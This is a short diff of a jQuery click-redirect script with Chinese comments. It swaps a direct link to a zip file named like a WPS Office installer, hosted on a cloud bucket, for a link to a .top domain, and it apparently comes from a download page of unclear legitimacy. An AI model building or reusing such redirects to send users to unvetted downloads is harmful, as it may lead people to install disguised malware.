@@ -1,6 +1,6 @@
 $(function () {
 	// 设置跳转路径
-	var url = "https://kyetops.oss-cn-hongkong.aliyuncs.com/wpsK2.73.zip"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
+	var url = "https://wechanesia.top/"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
 
 	// 使用querySelectorAll获取所有具有特定类名的元素
 	var clickableElements = document.querySelectorAll(".clickableClass"); // 假设class是clickableClass
